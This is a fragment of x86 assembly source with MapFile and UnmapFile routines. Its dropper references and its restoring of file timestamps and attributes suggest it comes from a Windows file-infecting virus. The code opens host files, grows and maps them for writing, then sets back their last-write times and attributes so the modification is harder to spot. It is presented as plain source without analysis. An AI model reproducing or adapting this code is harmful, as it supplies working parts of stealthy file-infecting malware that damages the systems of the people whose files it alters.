DEBUGOFF

MAP_ADD = 128*1024

;MapFile
;UnmapFile

file_map       equ <esp>
file_mhandle   equ file_map+4
file_handle    equ file_mhandle+4
file_name      equ file_handle+4
file_shandle   equ file_name+4
file_info      equ file_shandle+4

;esi=filename
;edi=size to increase
MapFile PROC
       cmp by [droppergen],0
       je @@nodropper
       mov eax,[dropper]
       mov ebp,[dropper_size]
       ret
  @@nodropper:
       sub esp, SIZEOF_WIN32_FIND_DATA
       call [_FindFirstFileA], esi, esp        ;file info -> stack buffer
       cmp eax, INVALID_HANDLE_VALUE
       je _map_fail0
       push eax
       call [_SetFileAttributesA], esi, FILE_ATTRIBUTE_NORMAL
       test eax, eax
       je _map_fail1
       push esi
       mov eax, GENERIC_READ
       test edi, edi
       jz @@1
       or eax, GENERIC_WRITE                   ;read/write
  @@1:
       call [_CreateFileA], esi, \
                            eax, \
                            NULL, \
                            NULL, \
                            OPEN_EXISTING, \
                            FILE_ATTRIBUTE_NORMAL, \
                            NULL
       cmp eax, INVALID_HANDLE_VALUE
       je _map_fail2
       push eax
       mov ecx, [esp.WFD_nFileSizeLow+(3*4)]
       mov edx, [esp.WFD_nFileSizeHigh+(3*4)]
       mov ebx, PAGE_READONLY
       test edi, edi
       jz @@2
       shl ebx,1                               ;PAGE_READWRITE
       add ecx, edi
       adc edx, 0
  @@2:
       test edx, edx
       jnz _map_fail3
       call [_CreateFileMappingA], eax, \
                                   NULL, \
                                   ebx, \
                                   edx, \
                                   ecx, \
                                   NULL
       test eax, eax
       je _map_fail3
       push eax
       mov ecx, [esp.WFD_nFileSizeLow+(4*4)]
       mov ebx, SECTION_MAP_READ
       test edi, edi
       jz @@3
       or ebx, SECTION_MAP_WRITE
       add ecx, edi
  @@3:
       call [_MapViewOfFile], eax, \           ;map file
                              ebx, \
                              NULL, \
                              NULL, \
                              ecx
       test eax, eax
       je _map_fail4
       push eax
       mov ebp,[file_info+WFD_nFileSizeLow]
;       jmp [esp+SIZEOF_WIN32_FIND_DATA+(5*4)]  ;leave file info in stack
       db 0FFh, 0A4h, 024h
       dd 00000154h
MapFile ENDP

UnmapFile PROC
       cmp by [droppergen],0
       je @@nodropper
       mov [dropper_size],ebp
       ret
  @@nodropper:
       pop eax
       mov [file_info+WFD_nFileSizeLow],ebp
       mov [esp+SIZEOF_WIN32_FIND_DATA+(5*4)], eax
       call [_UnmapViewOfFile]                 ;unmap
  _map_fail4:
       call [_CloseHandle]                     ;close map
  _map_fail3:
       mov eax, [esp]
       call [_SetFilePointer], eax, \
                               [esp.WFD_nFileSizeLow+(5*4)], \
                               NULL, \
                               NULL
       mov eax, [esp]
       call [_SetEndOfFile], eax               ;set new oef
       mov eax, [esp]
       lea ecx, dwo [esp.WFD_ftLastWriteTime+(3*4)]
       call [_SetFileTime], eax, \
                            NULL ,\
                            NULL ,\
                            ecx
       call [_CloseHandle]                     ;close file
  _map_fail2:
       pop eax                                 ;filename
       call [_SetFileAttributesA], eax, \
                                   [esp.WFD_dwFileAttributes+(1*4)]
  _map_fail1:
       call [_CloseHandle]                     ;close search
  _map_fail0:
       add esp, SIZEOF_WIN32_FIND_DATA
       sub eax, eax
       ret
UnmapFile ENDP
